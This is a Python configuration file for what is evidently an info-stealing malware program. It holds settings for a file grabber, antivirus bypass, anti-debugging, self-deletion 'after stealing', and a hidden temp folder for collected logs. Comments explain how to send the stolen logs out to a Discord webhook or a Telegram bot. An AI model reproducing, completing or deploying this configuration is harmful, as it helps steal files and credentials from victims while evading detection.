from os import environ
from os.path import join

class config:
    enableFileGrabber = False #enable file grabber
    oneStart = False #enable this if you want logs to come only from unique computers
    id = 123456789101112 #unique id for oneStart
    avbypass = True #enable antiviruses bypass
    selfDestruct = False #deletes itself after stealing
    debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
    pathToLogs = join(environ["TEMP"], "923462db-6578-4ed1-beaf-f03d9860d883") #path where will be stored logs before sending (from user dir)

    sendData = [] # You can write your address for sending logs here

    #example for Discord [0, "url of your WebHook", "null"]
    #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID"]